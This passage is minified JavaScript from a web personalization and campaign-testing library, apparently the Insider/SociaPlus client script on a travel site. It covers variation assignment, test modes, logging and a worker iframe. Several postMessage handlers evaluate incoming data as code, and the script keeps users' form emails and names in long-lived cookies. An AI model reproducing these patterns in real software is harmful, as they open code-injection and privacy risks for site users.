if(spApi.userSegments[prsnlztnId]==undefined||typeof spApi.userSegments[prsnlztnId]=='undefined'){try{var isSegmentValid=true;var prsnlztnStatus=false;if(prsnlztn.segment!=undefined&&prsnlztn.segment!=null&&prsnlztn.segment.length>0){if(!spApi.e(spApi.rules[prsnlztn.segment[0]].test)){isSegmentValid=false;}else{delete spApi.userSegments[prsnlztnId];}}}catch(err){spApi.errLog(err,{logType:'getPersonalizationCamp-blok1-'+prsnlztnId,bugType:'partner',extraData:{param1:JSON.stringify(prsnlztn)}});}
var totalRatio=0;var randomRatio=parseInt(Math.random()*100);var displayedVar=false;if(isSegmentValid){sQuery.each(prsnlztn.variations,function(key,variation){try{if(variation!=null&&variation.varId){if(!spApi.spCampCheckStatus(variation.varId,"step1-displayed")){oldRatio=Number(totalRatio);totalRatio+=Number(variation.ratio);if(!displayedVar&&oldRatio<=randomRatio&&randomRatio<totalRatio){spApi.userSegments[prsnlztnId]=variation.varId;newSegmentList[prsnlztnId]={id:variation.varId,ratio:"o:"+oldRatio+" r:"+randomRatio+" t:"+totalRatio+" var ratio:"+variation.ratio};return true;}}else{spApi.userSegments[prsnlztnId]=variation.varId;newSegmentList[prsnlztnId]={id:variation.varId,ratio:"already shown. var ratio:"+variation.ratio};return false;}}}catch(err){spApi.errLog(err,{logType:'getPersonalizationCamp-blok2-'+prsnlztnId,bugType:'partner',extraData:{param1:JSON.stringify(variation)}});}});}}});try{data={key:'user-segments',obj:spApi.userSegments};var tempSegment=JSON.stringify(spApi.userSegments);if(spApi.checkCampBuilderTest()){var variationCandidates=spApi.getCampBuilderCandidates();var testBuilderId=spApi.getObjectFirstKey(variationCandidates);if(spApi.userSegments[testBuilderId]&&data.obj[testBuilderId]){spApi.userSegments[testBuilderId]=data.obj[testBuilderId]=variationCandidates[testBuilderId];}}
if(spApi.checkCampTest()){data.obj=spApi.userSegments={};}
spApi.updateCookie(data,"nolog");}catch(err){spApi.errLog(err,{logType:'getPersonalizationCamp-blok3',bugType:'partner',extraData:{param1:JSON.stringify(tempSegment)}});}},getPersonalizationId:function(id){var variationCampId;try{sQuery.each(spApi.personalizationCamps,function(campId,prsnlztn){if(typeof prsnlztn=='undefined'){return;}
sQuery.each(prsnlztn.variations,function(varKey,variation){if(variation.varId==id){variationCampId=campId;}});});return variationCampId;}catch(err){spApi.errLog(err,{logType:'getPersonalizationId',bugType:'partner',extraData:{param1:id}});}},isControlCamp:function(id){var cgStatus=false;sQuery.each(spApi.personalizationCamps,function(campId,prsnlztn){if(typeof prsnlztn=='undefined'){return;}
sQuery.each(prsnlztn.variations,function(varKey,variation){if(typeof prsnlztn=='undefined'){return;}
if(variation.varId==id&&variation.type=="cg"){cgStatus=true;}});});return cgStatus;},checkVarSegment:function(variation){var status=true;sQuery.each(spApi.personalizationCamps,function(prsnlztnId,prsnlztn){if(typeof prsnlztn=='undefined'){return;}
sQuery.each(prsnlztn.variations,function(key,vari){if(typeof prsnlztn=='undefined'){return;}
if(vari&&vari.varId==variation['id']){if(spApi.userSegments[prsnlztnId]==variation['id']){status=true;return true;}else{status=false;return false;}}});});return status;},checkCampBuilderTest:function()
{if(!panelEdit){return(!spApi.hasParameter('insExitTestMode')&&(spApi.hasParameter('campBuilderTest')||document.referrer.indexOf("campBuilderTest")>-1||sQuery.cookie('variationCandidate')!=null))?true:false;}
return false;},checkCampBuilderTestWeather:function()
{if(!panelEdit){return(!spApi.hasParameter('insExitTestMode')&&(spApi.hasParameter('isWeatherTargeting')||document.referrer.indexOf("isWeatherTargeting")>-1||sQuery.cookie('testInfoWeather')!=null))?true:false;}
return false;},showWeeklyForecast:function()
{if(sQuery('#yesWeekly').is(':checked')){sQuery('#weeklyStatus').show();}else{sQuery('#weeklyStatus').hide();sQuery.cookie("weeklyWeather",null,{path:'/',domain:cookieDomain});}},getCampBuilderCandidates:function()
{try{var vc=sQuery.cookie("variationCandidate");var segment=(vc=="undefined"||vc==null)?{}:sQuery.parseJSON(sQuery.cookie("variationCandidate"));if(spApi.checkCampBuilderTest()&&spApi.hasParameter('build'))
segment=sQuery.parseJSON('{"'+spApi.Base64.decode(spApi.getParameter('build'))+'":"'+spApi.Base64.decode(spApi.getParameter('var'))+'"}');else if(spApi.checkCampBuilderTest()&&document.referrer.indexOf("build")>-1)
segment=sQuery.parseJSON('{"'+spApi.Base64.decode(spApi.getParameterFromUrl(document.referrer,'build'))+'":"'+spApi.Base64.decode(spApi.getParameterFromUrl(document.referrer,'var'))+'"}');return segment;}catch(err){spApi.errLog(err,{logType:'getCampBuilderCandidates',bugType:'product'});}},setCampBuilderTest:function()
{if(spApi.checkCampBuilderTest())
sQuery.cookie("variationCandidate",JSON.stringify(spApi.getCampBuilderCandidates()),{path:'/',domain:cookieDomain});(spApi.checkCampBuilderTestWeather())?spApi.showCampBuilderTestWeatherInfo():spApi.showCampBuilderTestInfo();},getObjectFirstKey:function(obj)
{for(var i in obj)
return i;return 0;},showTestCampInstantly:function(campId)
{if(typeof campId!=='undefined'&&campId!=null){var camp=spApi.getCamp(campId).camp;if(typeof camp!=='undefined'){camp.trigTimeOut="0";if(campId.charAt(0)=='c'){spApi.showCustomCamp(camp);}else{spApi.showCamp(camp);}}}},checkVersusTest:function()
{if(document.referrer.indexOf(".panel.")==-1){return(spApi.hasParameter("versusTest")||document.referrer.indexOf("versusTest")>-1)?true:false;}
return false;},showCampBuilderTestInfo:function()
{if(spApi.checkCampBuilderTest()||spApi.checkCampTest()||spApi.checkVersusTest()){try{setTimeout(function(){sQuery('#spWorker').pm(function(){return sQuery.cookie('testInfo');},function(info){if(info!=null){info=spApi.Base64.decode(info);spApi.showTestInfoHtml(info);spApi.toogleTestInfo();}});},1500);}catch(err){spApi.errLog(err,{logType:'showCampBuilderTestInfo',bugType:'product'});}}},showCampBuilderTestWeatherInfo:function()
{if(spApi.checkCampBuilderTestWeather()){try{setTimeout(function(){sQuery('#spWorker').pm(function(){return sQuery.cookie('testInfoWeather');},function(info){if(info!=null){sQuery.cookie("testInfoWeather",info,{path:'/',domain:cookieDomain});info=spApi.Base64.decode(info);spApi.showTestInfoHtml(info);spApi.getWeatherDataFillSelectBoxInput();spApi.toogleTestInfo();}});},1500);}catch(err){spApi.errLog(err,{logType:'showCampBuilderTestWeatherInfo',bugType:'product'});}}},exitFromTestMode:function()
{spApi.worker.asyncPM('deleteTestCookies','1',function(){var variationCandidate=JSON.parse(sQuery.cookie('variationCandidate'));var firstKey=Object.keys(variationCandidate)[0];sQuery.cookie('variationCandidate',null,{expires:1,path:'/',domain:cookieDomain});spApi.storageData('sp-camp-'+variationCandidate[firstKey],null,null,function(){var exitParam='#insExitTestMode';if(spApi.urlParamSep){exitParam='?insExitTestMode';}
window.location.href=spApi.siteUrl+exitParam;});});},showTestInfoHtml:function(info)
{var btn='<div style="position: fixed; top: 0; padding: 12px; text-align: center; background-color: #000000; z-index: 2147483645;"><a class="testLinkShow" style="cursor: pointer; color: #FFFFFF;"><img src="//klook.api.sociaplus.com/images/expand.png" /></a></div>';sQuery("body").append(btn);var html='<div class="testLinkBar" style="position: fixed; top: 0; width: 100%; padding: 12px 0px; text-align: center; background-color: #000000; color: #FFFFFF; z-index: 2147483647;">';html+='<span style="margin-left: 12px; float: left;"><a class="testLinkHide" style="cursor: pointer;"><img src="//klook.api.sociaplus.com/images/compress.png"></a></span>';html+=info;html+='</div>';sQuery("body").append(html);},toogleTestInfo:function()
{sQuery(document).on("click",".testLinkHide",function(event){sQuery(".testLinkBar").slideUp();});sQuery(document).on("click",".testLinkShow",function(event){sQuery(".testLinkBar").slideDown();});},setLangDictionary:function()
{if(spApi.getLang()=="tr_TR"){spApi.spLang="tr";}else if(spApi.getLang()=="ru_RU"){spApi.spLang="ru";}else{spApi.spLang="en";}
spApi.lang["en"]={};spApi.lang["en"]["weatherTestModuleText1"]="Weather data is not properly set!";spApi.lang["en"]["weatherTestModuleText2"]="Weather data can not be retrieved. It does not exist or empty!";spApi.lang["en"]["weatherTestModuleText3"]="Please enter a temperature to test!";},weeklyWeatherOnChange:function()
{spApi.sessionStorageSet('weatherInfo-weekly',spApi.sessionStorageGet('originalWeeklyWeatherObject'));sQuery.cookie("weeklyWeather",null,{path:'/',domain:cookieDomain});},setWeatherInfoSessionObjectForTestModule:function()
{var temperature=sQuery('#temperatureTest').val();var weatherStatus=sQuery('#weatherStatusTest').val();var weekDay=0;var weatherObject={};var isWeekly=false;if(sQuery('#yesWeekly').is(':checked')){weekDay=sQuery('#weeklyStatus').val();weatherObject=spApi.sessionStorageGet('weatherInfo-weekly');if(weatherObject!=undefined&&weatherObject!='undefined'&&weatherObject!=null){spApi.sessionStorageSet('originalWeeklyWeatherObject',weatherObject);weatherObject=sQuery.parseJSON(weatherObject).weekly;weatherObject=weatherObject[weekDay];sQuery.cookie("weeklyWeather",sQuery('#weeklyStatus').val(),{path:'/',domain:cookieDomain});isWeekly=true;}else{sQuery('#testResultMessage').html(spApi.lang[spApi.spLang].weatherTestModuleText2);}}else{spApi.sessionStorageSet('weatherInfo-weekly',spApi.sessionStorageGet('originalWeeklyWeatherObject'));sQuery.cookie("weeklyWeather",null,{path:'/',domain:cookieDomain});weatherObject=spApi.sessionStorageGet('weatherInfo-current');weatherObject=sQuery.parseJSON(weatherObject);}
if(temperature.length<1){sQuery('#testResultMessage').html(spApi.lang[spApi.spLang].weatherTestModuleText3);return false;}
if(weatherObject!=undefined&&weatherObject!='undefined'){if(weatherObject.constructor.name=="Object"){weatherObject.type=weatherStatus;weatherObject.temperature=temperature;if(isWeekly){var weeklyWeatherObject=spApi.sessionStorageGet('weatherInfo-weekly');weeklyWeatherObject=sQuery.parseJSON(weeklyWeatherObject);weeklyWeatherObject.weekly[weekDay]=weatherObject;spApi.sessionStorageSet('weatherInfo-weekly',JSON.stringify(weeklyWeatherObject));}else{spApi.setSessionStorage('weatherInfo-current',weatherObject);}
window.location.reload();}else{sQuery('#testResultMessage').html(spApi.lang[spApi.spLang].weatherTestModuleText1);}}else{sQuery('#testResultMessage').html(spApi.lang[spApi.spLang].weatherTestModuleText2);}},getWeatherDataFillSelectBoxInput:function()
{var weatherObject={};var weekDay=0;if(sQuery.cookie('weeklyWeather')!=null){weekDay=sQuery.cookie('weeklyWeather');weatherObject=spApi.sessionStorageGet('weatherInfo-weekly');weatherObject=sQuery.parseJSON(weatherObject).weekly;weatherObject=weatherObject[weekDay];sQuery('#yesWeekly').attr('checked',true);sQuery('#weeklyStatus').show();sQuery('#weeklyStatus').val(weekDay);}else{weatherObject=spApi.sessionStorageGet('weatherInfo-current');weatherObject=sQuery.parseJSON(weatherObject);}
if(weatherObject!=undefined&&weatherObject!='undefined'){if(weatherObject.constructor.name=="Object"){sQuery('#temperatureTest').val(weatherObject.temperature);sQuery('#weatherStatusTest').val(weatherObject.type);}}},checkCampTest:function()
{if(document.referrer.indexOf(".panel.")==-1){return(spApi.hasParameter('campTest')||document.referrer.indexOf("campTest")>-1||sQuery.cookie('campCandidate')!=null)?true:false;}
return false;},getCampCandidate:function()
{try{var camp=sQuery.cookie("campCandidate");if(spApi.checkCampTest()&&spApi.hasParameter('camp'))
camp=spApi.Base64.decode(spApi.getParameter('camp'));else if(spApi.checkCampTest()&&document.referrer.indexOf("camp")>-1)
camp=spApi.Base64.decode(spApi.getParameterFromUrl(document.referrer,'camp'));return camp;}catch(err){spApi.errLog(err,{logType:'getCampCandidate',bugType:'product'});}},setCampTest:function()
{if(spApi.checkCampTest()){sQuery.cookie("campCandidate",spApi.getCampCandidate(),{path:'/',domain:cookieDomain});spApi.showCampBuilderTestInfo();}}};Object.setPrototypeOf=Object.setPrototypeOf||function(obj,proto){obj.__proto__=proto;return obj;}
Object.setPrototypeOf(spApi,{uidExpireDate:365});spApi.getPrototype=function(key){return spApi.__proto__[key];};spApi.objKeys=function(obj){return Object.keys(obj).length>0}
spApi.localStorageGet=function(storageName){try{return localStorage[storageName]||null;}catch(e){return null;}};spApi.localStorageSet=function(storageName,storeValue){try{return localStorage[storageName]=storeValue;}catch(e){return null;}};spApi.localStorageRemoveItem=function(storageName){try{return delete localStorage[storageName];}catch(e){return null;}};spApi.sessionStorageGet=function(storageName){try{return sessionStorage[storageName]||null;}catch(e){return null;}};spApi.sessionStorageSet=function(storageName,storeValue){try{return sessionStorage[storageName]=storeValue;}catch(e){return null;}};spApi.sessionStorageRemoveItem=function(storageName){try{return delete sessionStorage[storageName];}catch(e){return null;}};setEmailToCookie=function(name,value,expire,domain){if(spApi.validateEmail(value)){if(expire===undefined)
expire=365;if(domain===undefined)
domain=cookieDomain;sQuery.cookie(name,value,{expires:expire,path:'/',domain:domain});}};var setUserDataToCookie=(function(userDatas){if(userDatas==false||typeof(userDatas)=='undefined')
return;var cookieName="insUserData";var save=function(createUserData){createUserData=JSON.stringify(createUserData);sQuery.cookie(cookieName,createUserData,{expires:365*10,path:"/",domain:cookieDomain});spApi.localStorageSet(cookieName,createUserData);}
var createUserData={};sQuery(userDatas.Login.button).live('click',function(){if(!spApi.validateEmail(sQuery(userDatas.Login.email).val()))return;if(sQuery.cookie(cookieName)!==null){var cookieContent=JSON.parse(sQuery.cookie(cookieName));createUserData=cookieContent;}
createUserData.email=sQuery(userDatas.Login.email).val();save(createUserData);});sQuery(userDatas.Register.button).live('click',function(){if(!spApi.validateEmail(sQuery(userDatas.Register.email).val()))return;createUserData.email=sQuery(userDatas.Register.email).val();createUserData.city=sQuery(userDatas.Register.city).val();createUserData.region=sQuery(userDatas.Register.region).val();createUserData.name=sQuery(userDatas.Register.name).val();save(createUserData);spApi.sessionStorageSet('isRegSuccess',1);});})(spApi.setEmailToCookie());spApi.timeOut=function(call,time){return setTimeout(function(){try{call();}catch(err){spApi.errLog(err,{logType:'setTimeout Error',bugType:'partner',extraData:{time:time,callback:call.toString()}});}},time);};spApi.interval=function(call,time){return setInterval(function(){try{call();}catch(err){spApi.errLog(err,{logType:'setInterval Error',bugType:'partner',extraData:{time:time,callback:call.toString()}});}},time);};spApi.ruleControl=function(rule,camp){try{rule.test=rule.test.replace(/setTimeout/g,'spApi.timeOut');rule.test=rule.test.replace(/setInterval/g,'spApi.interval');if(camp.isTest=="1"){var variationCandidates=spApi.getCampBuilderCandidates();var testBuilderId=spApi.getObjectFirstKey(variationCandidates);if(variationCandidates[testBuilderId]==camp.id){return spApi.e(rule.test)===true;}
var testCampId=spApi.getCampCandidate();if(testCampId==camp.id){return spApi.e(rule.test)===true;}
return false;}else{return spApi.e(rule.test)===true;}}catch(err){var extraData={campaignName:spApi.decryptCampName(camp.campName),campaignId:camp.id};if(rule){extraData.ruleName=rule.name;extraData.ruleId=rule.id;extraData.ruleContent=rule.test}else{extraData.rule="undefined rule";}
spApi.errLog(err,{logType:'Rule Error',bugType:'partner',extraData:extraData});return false;}};spApi.getGlobalUserIdFromLocalStorage=function(){if(spApi.storageData('insGUID')!=null){return spApi.Base64.decode(spApi.storageData('insGUID'));}
return null;};spApi.campEventControl=function(eventName,callback){try{callback();}catch(err){spApi.errLog(err,{logType:'Campaign Event Error',bugType:'partner',extraData:{event:eventName,callback:callback.toString()}});}};spApi.debugModeOpen=function(){sQuery.cookie('spDebugMode',1,{expires:1,path:'/',domain:cookieDomain});spApi.logger('info','Debug Mode Active');};spApi.debugModeClose=function(){sQuery.cookie('spDebugMode',null,{expires:1,path:'/',domain:cookieDomain});spApi.logger('info','Debug Mode Passive');};spApi.debugModeIsOpen=function(){return sQuery.cookie('spDebugMode')!==null||false;};spApi.conLog=function(){if(spApi.debugModeIsOpen()&&typeof console.log!=='undefined'){console.log.apply(console,arguments);}};spApi.logger=function(type,message,campID){try{message=spApi.Base64.encode(message);if(typeof spApi.apiLogs==="undefined"){spApi.apiLogs={'camps':{},'general':[]};}
if(typeof campID!=="undefined"){if(typeof spApi.apiLogs.camps[campID]==="undefined"){spApi.apiLogs.camps[campID]=[];}
var logObject={'campID':campID,'type':type,'message':message,'time':new Date().getTime()};spApi.apiLogs.camps[campID].push(logObject)}
else{var logObject={'campID':campID,'type':type,'message':message,'time':new Date().getTime()};spApi.apiLogs.general.push(logObject)}
if(spApi.debugModeIsOpen()){if(type=='info'&&typeof console.info!=='undefined'){if(typeof campID==="undefined"){console.info(spApi.Base64.decode(message),'Log Time:',logObject.time);}
else{console.info(spApi.Base64.decode(message),'Camp ID:',campID,'Log Time:',logObject.time);}}
else if(type=='warning'&&typeof console.warn!=='undefined'){if(typeof campID==="undefined"){console.warn(spApi.Base64.decode(message),'Log Time:',logObject.time);}
else{console.warn(spApi.Base64.decode(message),'Camp ID:',campID,'Log Time:',logObject.time);}}
else if(type=='error'&&typeof console.error!=='undefined'){if(typeof campID==="undefined"){console.error(spApi.Base64.decode(message),'Log Time:',logObject.time);}
else{console.error(spApi.Base64.decode(message),'Camp ID:',campID,'Log Time:',logObject.time);}}}}
catch(e){spApi.errLog(e);}
return true;}
spApi.getLogs=function(campID){if(typeof spApi.apiLogs==="undefined"||spApi.apiLogs.length<1){return{};}
var logs={'camps':{},'general':[]};sQuery.each(spApi.apiLogs.camps,function(i,l){logs.camps[i]=[];sQuery.each(l,function(k,val){var logObject=sQuery.extend(true,{},val);logObject.message=spApi.Base64.decode(logObject.message);logs.camps[i].push(logObject);});});sQuery.each(spApi.apiLogs.general,function(i,val){var logObject=sQuery.extend(true,{},val);logObject.message=spApi.Base64.decode(logObject.message);logs.general.push(logObject);});if(typeof campID!=="undefined"){if(typeof spApi.apiLogs.camps[campID]!=="undefined"){return logs.camps[campID];}
return false;}
return logs;}
if(spApi.debugModeIsOpen()){spApi.logger('info','Debug Mode Active');}
spApi.setCampTest();spApi.setLangDictionary();spApi.setCampBuilderTest();spApi.addDbLog(null);pm.bind('getPaidProductsCategories',function(data){return spApi.storageData("prodCats");});pm.bind('GAClickCounter',function(data){spApi.conLog('GA Event Worked..');spApi.conLog('Coupon Code: '+data.value);ga('send','event','KliksaTest','Promo',data.value,{'nonInteraction':1});});pm.bind('sQueryPM',function(data){var result=null;try{result=spApi.e('('+decodeURI(data.callback)+')('+data.data+')');}catch(err){spApi.errLog(err,{logType:'PM Error (from window)',bugType:'partner',extraData:{campId:data.campId,params:JSON.stringify(data.data)||"",callback:String(decodeURI(data.callback))}});}
return result;});pm.bind("getUserIdFromPartnerDomain",function(){var spUID=sQuery.cookie("spUID");return spUID;});pm.bind('spApiPM',function(data){var result=spApi.e(data.query);if(result)return result;});pm.bind('update-size',function(data){spApi.attr.spContent.width=data.width;spApi.attr.spContent.height=data.height;spApi.attr.spEvent.width=data.width+spApi.attr.spHeader.width+3;});pm.bind('update-fancybox-size',function(data){document.getElementsByClassName('sp-fancybox-wrap')[0].style.setProperty('width',data.width+'px','important');document.getElementsByClassName('sp-fancybox-inner')[0].style.setProperty('width',data.width+'px','important');document.getElementsByClassName('sp-fancybox-inner')[0].style.setProperty('height',data.height+'px','important');});pm.bind('autoFit',function(data){var params={'height':data.height,'width':data.width};if(typeof data.onlyHeight!=="undefined"&&data.onlyHeight==true){var campIdPrefix='';var advancedCssClass=''
if(typeof data.campId!=='undefined'){campIdPrefix='-'+data.campId;advancedCssClass='.sp-advanced-css-'+data.campId+' ';}
params={'height':data.height};sQuery('#insdrInfoHeightStyle'+campIdPrefix).remove();sQuery('body').append('<style id="insdrInfoHeightStyle'+campIdPrefix+'">'+
advancedCssClass+'.sp-fancybox-inner, '+advancedCssClass+'.sp-inline-iframe { height: '+data.height+'px !important; }'+'</style>');}else{sQuery('.sp-fancybox-outer').css(params);sQuery('.sp-fancybox-wrap').css(params);sQuery('.sp-fancybox-skin').css(params);sQuery(".sp-fancybox-inner").css(params);sQuery(".sp-fancybox-iframe").css(params);sQuery('.sp-fancybox-wrap').css("visibility","visible");}});pm.bind('close-fancybox',function(data){var updateCookieType=typeof data.updateCookieType!=='undefined'?data.updateCookieType:'';var effectConfig;var positionType;var camp=spApi.getCamp(data.campId).camp;var notifySettings=spApi.notifies[camp.id];effectConfig=notifySettings.effectConfig;if(camp.productType==24){positionType=notifySettings.locationConfig.type;}
var closeCamp=function(){if(typeof notifySettings!="undefined"&&typeof notifySettings.locationConfig!="undefined"&&positionType=="2"){sQuery('.sp-inline-wrap-'+camp.id).remove();}else{sQuery.fancybox.close();}};var closeEffect=function(){if(typeof notifySettings!="undefined"&&typeof notifySettings.locationConfig!="undefined"&&positionType=="2"){sQuery('.sp-inline-wrap-'+camp.id).effective(effectConfig.close);}else{sQuery('.sp-fancybox-skin').effective(effectConfig.close);}}
if(effectConfig instanceof Object&&typeof effectConfig.close!=="undefined"){effectConfig.close.dialog.complete=function(){closeCamp();}
closeEffect();}else{closeCamp();}
if(data.cookieType=="liked"){data={key:'sp-camp-'+data.campId,obj:{'liked':data.cookieValue},campId:data.campId};spApi.updateCookie(data);}else if(data.cookieType=="closed"){data={key:'sp-camp-'+data.campId,obj:{'closed':true},campId:data.campId};spApi.updateCookie(data,updateCookieType);}
if(typeof spApi.mask.isLoaded()!=="undefined"){spApi.mask.closeSlient();}
sQuery('html').unbind('mousemove');});pm.bind('set-cookie',function(data){spApi.updateCookie(data);});pm.bind('execute',function(data){return spApi.e(data);});pm.bind('get-cookie',function(data){var c=sQuery.cookie(data.key)!=null?sQuery.cookie(data.key):spApi.storageData(data.key);if(c){c=JSON.parse(c);return{err:null,response:c};}else{return{err:true,response:false};}});pm.bind("getGlobalIdSettingStatus",function(data){return spApi.globalUserIdIsDisabled;});pm.bind('campEventTrigger',function(data){if(typeof data.campId==="undefined"||typeof data.callbackType==="undefined"){return false;}
var camp=spApi.getCamp(data.campId).camp;sQuery.each(camp.callbacks[data.callbackType],function(key,callback){spApi.campEventControl(data.callbackType,callback);});});pm.bind('set-localStorage',function(data){localStorage.setItem(data.key,data.data);});pm.bind('clear-cookie',function(data){spApi.storageData("paid-products","",{path:'/',domain:cookieDomain});});pm.bind('updatePaidProducts',function(data){spApi.storageData("paid-products",sQuery.toJSON(data),{path:'/',domain:cookieDomain});});pm.bind('get-url-param',function(data){return spApi.getParameter(data);});pm.bind('setFrameCSS',function(data){if(data.funcType=="set"){sQuery(data.selector).css(data.attr,data.value);}});pm.bind("set-coupon-assistant",function(data){spApi.setCouponAsistant(data.couponSet,data.fromPurcha);});pm.bind("get-current-product",function(data){return spApi.getCurrentProduct();});pm.bind("startNoteTimer",function(data){return spApi.noteTimer(data);});pm.bind('get-paid-products',function(data){return localStorage.getItem("paid-products");});pm.bind("gaSend",function(data){return spApi.gaSend(data);});function processAnalyticsResult(data){if(data&&typeof data.count!="undefined")
{return data.count;}
return 0;}
if(typeof spApi.worker=="undefined"){if(initCondition){if(sQuery.cookie('spDebugMode')==1)
spApi.consoleLog.push("INSIDER(formerly SOCIAPlus) API is ready.");function insCreateUID(){var idStrLen=32;var spUID=(Math.floor((Math.random()*25))+10);spUID+=(new Date()).getTime();do{spUID+=(Math.floor((Math.random()*15))).toString(36);if(spUID.length==23)
spUID+=".";}while(spUID.length<idStrLen);return spUID;}
function gaLog(campId){_gaq.push(['_setCustomVar',5,'Insider',campId,2]);_gaq.push(['_trackEvent','SociaPlus','impression',campId]);}
var dimensionControl=false;WorkerFrame=function(){var gaSegmentIsActive=false;sQuery.each(spApi.personalizationCamps,function(key,value){if(value.gaSegmentId!=''){gaSegmentIsActive=true;return false;}});var wf=this;sQuery('body').elementLoadComplete(function(){sQuery('<iframe id="spWorker" style="display:none;" src="https://klook.api.sociaplus.com/worker.html"></iframe>').appendTo(sQuery('body'));var workerLoad=setInterval(function(){if(sQuery('#spWorker').length>0){wf._window=sQuery('#spWorker')[0].contentWindow;wf.ping();clearInterval(workerLoad);}},100);},{i:1,t:5000});};WorkerFrame.prototype.ping=function(callback){try{wf=this;var intervalId=setInterval(function(){pm({target:wf._window,type:'are-you-ready',data:{no:"data",noLog:window.noLog},success:function(data){if(!dimensionControl){spApi.gaDimensionQ=data.dimensionResults;if(typeof spApi.setCustomSegments=='function'){spApi.setCustomSegments(spApi.customSegments);}
spApi.logger('info','Worker yklendi...');dimensionControl=true;}
wf.ready=true;sQuery(document).trigger('workerFrameReady');spApi.salesSesId=spApi.Base64.encode(spApi.getGAStyleSesId());spApi.setCampSalesSesId();if(sQuery.cookie('spUID')==null){if(spApi.getBrowser()=='Safari'&&(data.spUID=='null'||data.spUID==null||data.spUID=='undefined')){data.spUID=insCreateUID();}
sQuery.cookie('spUID',data.spUID,{expires:spApi.getPrototype('uidExpireDate'),path:'/'});}else{sQuery.cookie('spUID',sQuery.cookie('spUID'),{expires:spApi.getPrototype('uidExpireDate'),path:'/'});pm({target:sQuery('#spWorker')[0].contentWindow,type:"set-spUID",data:{value:sQuery.cookie('spUID')}});}
clearInterval(intervalId);if(callback)
callback();}});},500);}catch(err){}};WorkerFrame.prototype.send=function(type,data,callback){wf=this;if(this.ready){if(data.type=='joined'){spApi.gaSend(data);spApi.addDbLog(data);}
else{if(spApi.getBrowser()=='Safari'){data.userID=sQuery.cookie('spUID');}
var checkLogKey=true;if(typeof data.type==='undefined'||typeof data.campId==='undefined'||data.goalType==='productCategorySuccess'||data.goalType==='productSuccess'){checkLogKey=false;}
var timestamp=Math.floor(new Date().getTime()/1000);var logKey=data.type+'-'+timestamp+'-'+data.campId;if(typeof spApi.logsStack[logKey]==='undefined'||checkLogKey===false){spApi.logsStack[logKey]='1';pm({target:this._window,type:type,data:data,success:function(){spApi.logger('info','Worker ile '+data.type+' logu atld.',data.campId);if(data.type=='impression'||data.type=='join'||data.type=='camp-step1'||data.salesType=='sales'||data.salesType=='bounce-sales'||data.salesType=='variation-sales'||data.type=='closed'||data.type=='camp-step1-close'){spApi.gaSend(data);spApi.addDbLog(data);}else if(data.type=='sa-co'){spApi.addDbLog(data);}}});}}}else{setTimeout(function(){wf.send(type,data,callback);},1000)}};WorkerFrame.prototype.asyncPM=function(type,data,callback){wf=this;if(this.ready){pm({target:this._window,type:type,data:data,success:callback});}else{setTimeout(function(){wf.asyncPM(type,data,callback);},500);}};WorkerFrame.prototype.asyncFunc=function(func){wf=this;if(this.ready){func();}else{setTimeout(function(){func();},500);}};WorkerFrame.prototype.userIP=function(type,data,callback){wf=this;if(this.ready){pm({target:this._window,type:type,data:data,success:function(data){}});}else{setTimeout(function(){wf.userIP(type,data,callback);},1000)}}
WorkerFrame.prototype.sendCook=function(type,data,callback){wf=this;if(this.ready){pm({target:this._window,type:type,data:data,success:function(data){}});}else{setTimeout(function(){wf.send(type,data,callback);},1000)}};WorkerFrame.prototype.check=function(o,n,campId,callback){try{if(!campId)
return;else if(o==undefined&&n==undefined)
return;wf=this;var logType=[];sQuery.each(n,function(key,value){if(value==true){if(o==undefined||(o&&!o[key])){if(key=='step1-displayed'){logType.push('camp-step1');}else if(key=='step1-closed'){logType.push('camp-step1-close');}else if(key=='closedCouponTimer'){logType.push('closedCouponTimer');}else if(key=='couponAppliedTimer'){logType.push('couponAppliedTimer');}else if(key=='closed'){}else{logType.push(key);}}}});sQuery.each(logType,function(key,value){wf.send('do-logging',{type:value,campId:campId,paaRoiGroup:sQuery.parseJSON(spApi.storageData('sp-camp-'+campId)).paaRoiType,paaProductType:spApi.getCamp(campId).camp.productType},callback);});}catch(err){}};WorkerFrame.prototype.cookie=function(capsule,callback){wf=this;wf.sendCook(capsule.dataC.type,{data:capsule.dataC.cookie,key:capsule.dataC.key});};WorkerFrame.prototype.SetGlobalExperimentLog=function(logData){var logs=new Array('impression-A','impression-B','variation-sales-A','variation-sales-B');if(sQuery.inArray(logData.globalExperimentType,logs)>-1){spApi.worker.send('globalExperimentLogging',{type:logData.globalExperimentType,productType:'globalExperiment',ref:window.location.href});if(sQuery.inArray(logData.globalExperimentType,['impression-A','impression-B'])>-1){if(spApi.globalExperiment['gaPush']=="1"){var gaAction=(logData.globalExperimentType=='impression-A')?'Global-A':'Global-B';spApi.gaSend({type:'globalExperiment',action:gaAction,campId:0});}}}else{sQuery.post(spApi.apiUrl+'ajax.php?t=storeGlobalExperimentLog',logData);}}
WorkerFrame.prototype.SetGoalBuilderLog=function(logData){var key='sp-goal-'+logData.varId+'-'+logData.goalId;var subId=logData['subId']||'';if(logData.logType=='join'){var spGoal=spApi.storageData(key);logData.logType=(typeof spGoal=="undefined"||spGoal==null)?'join':'engage';}
var logKey=key+'-'+subId+'-'+logData.logType;if(sQuery.inArray(logKey,spApi.goalLogs)==-1){var other=(logData['other']!==undefined)?logData['other']:'';logData.builderId=logData.builderId.toString();logData.varId=logData.varId.toString();logData.goalId=logData.goalId.toString();var logs=new Array('engage','join','impression','sales');if(sQuery.inArray(logData.logType,logs)>-1){spApi.worker.send('goalBuilderLogging',{type:logData.logType,builderId:logData.builderId,varId:logData.varId,campId:logData.campId,goalId:logData.goalId,productType:logData.productType,goalType:logData.goalType,subId:subId,userId:logData.userId,ref:logData.ref,url:logData.url,other:other});if(logData.logType!='engage'){if(logData.logType=='join'){spApi.gaSend({builderId:logData.builderId,campId:logData.varId,type:'goal',goalId:logData.goalId});}
cData={key:key,obj:{'goalType':logData.logType},campId:logData["varId"]};spApi.updateCookie(cData,"nolog");}}else{var checkLogKey=true;if(typeof logData.logType==='undefined'||typeof logData.goalId==='undefined'){checkLogKey=false;}
var timestamp=Math.floor(new Date().getTime()/1000);var logKey=logData.logType+'-'+timestamp+'-'+logData.goalId;if(typeof spApi.logsStack[logKey]==='undefined'||checkLogKey===false){spApi.logsStack[logKey]='1';sQuery.post(spApi.apiUrl+'ajax.php?t=storeGoalBuilderLog',logData);}}
spApi.goalLogs.push(logKey);}}
WorkerFrame.prototype.SetCustomCampLog=function(logData){try{var other='';if(logData['other']!==undefined){other=logData['other'];}
